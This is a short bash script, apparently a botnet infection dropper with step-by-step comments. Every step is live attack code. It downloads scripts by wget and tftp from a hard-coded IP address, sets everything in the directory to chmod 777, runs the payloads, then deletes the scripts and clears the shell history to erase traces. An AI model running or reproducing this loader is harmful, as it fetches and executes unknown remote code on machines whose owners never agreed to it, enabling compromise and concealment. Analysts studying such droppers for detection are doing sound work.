#!/bin/bash

# Attempt to change to one of the specified directories
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /

# Download the AXIS.sh script
wget http://185.84.161.193/AXIS.sh

# Change permissions for all files in the current directory
chmod 777 *

# Execute the downloaded AXIS.sh script
sh AXIS.sh

# Download another script using TFTP
tftp -g 185.84.161.193 -r tftp1.sh

# Change permissions for all files again
chmod 777 *

# Execute the downloaded tftp1.sh script
sh tftp1.sh

# Remove all .sh files
rm -rf *.sh

# Clear command history
history -c
